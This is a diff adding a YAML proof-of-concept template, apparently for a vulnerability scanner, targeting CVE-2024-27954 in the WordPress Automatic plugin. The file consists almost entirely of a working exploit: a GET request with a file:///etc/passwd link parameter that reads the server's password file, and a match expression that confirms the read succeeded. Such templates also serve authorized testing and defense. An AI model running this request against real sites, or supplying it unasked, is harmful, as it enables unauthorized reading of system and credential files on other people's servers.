@@ -1,0 +1,25 @@
+id: poc-yaml-wordpress-automatic-plugin-anyfile-download
+info:
+  name: WordPress Automatic Plugin 任意文件下载漏洞(CVE-2024-27954)
+  severity: high
+  tags:
+  - CVE-2024-27954
+  - 任意文件或目录访问
+  finger: automatic
+  publicwww: /wp-content/plugins/wp-automatic
+requests:
+- method: GET
+  path: /?p=3232&wp_automatic=download&link=file:///etc/passwd
+  expression: 'status_code == 200 &&
+
+    contains(body,"root:") &&
+
+    contains(body,"/bin") &&
+
+    contains(body,"\"status\":\"success\"") &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
